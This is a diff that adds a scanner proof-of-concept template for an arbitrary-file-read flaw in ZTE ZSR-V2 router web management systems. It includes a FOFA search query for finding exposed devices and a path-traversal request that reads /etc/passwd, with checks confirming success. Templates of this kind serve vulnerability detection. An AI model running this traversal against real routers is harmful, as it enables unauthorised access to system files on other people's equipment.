@@ -1,0 +1,18 @@
+id: poc-yaml-zte-zsr-v2-router-anyfile-read
+info:
+  name: 中兴ZTE-ZSR-V2路由器Web管理系统 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: zsr
+  fofa: title="ZSRV2路由器Web管理系统"
+requests:
+- method: GET
+  path: /login.html
+  expression: status_code == 200 && contains(title,"ZSRV2")
+- method: GET
+  path: /../../../../../../../../../etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(headers,\"Server\\x3a ZTE\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
